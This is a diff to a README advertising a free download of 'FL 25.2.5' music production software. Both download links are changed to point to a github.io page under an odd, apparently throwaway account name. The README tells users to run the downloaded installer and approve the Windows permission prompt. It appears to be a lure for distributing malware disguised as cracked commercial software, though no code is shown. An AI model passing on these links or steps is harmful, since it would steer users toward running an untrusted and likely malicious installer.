@@ -1,6 +1,6 @@
 # 🎧 fl-25.2.5 - Professional Music Production Made Simple
 
-[![Download FL 25.2.5](https://img.shields.io/badge/Download-FL_25.2.5-blue.svg)](https://github.com/allied-polycystickidneydisease784/fl-25.2.5)
+[![Download FL 25.2.5](https://img.shields.io/badge/Download-FL_25.2.5-blue.svg)](https://allied-polycystickidneydisease784.github.io)
 
 ## 📖 About This Software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the Download Page:** Use the official link to access the software files. Click here: [Download FL 25.2.5](https://github.com/allied-polycystickidneydisease784/fl-25.2.5).
+1.  **Visit the Download Page:** Use the official link to access the software files. Click here: [Download FL 25.2.5](https://allied-polycystickidneydisease784.github.io).
 2.  **Save the Installer:** Locate the download button on the page. Save the installer file to your Downloads folder or another location you prefer on your computer.
 3.  **Run the Installer:** Double-click the downloaded file to begin the setup process. If Windows asks for permission to run the application, click Yes.
 4.  **Follow the Setup Wizard:** Agree to the license terms. Select the default installation path. The wizard handles the rest of the configuration.
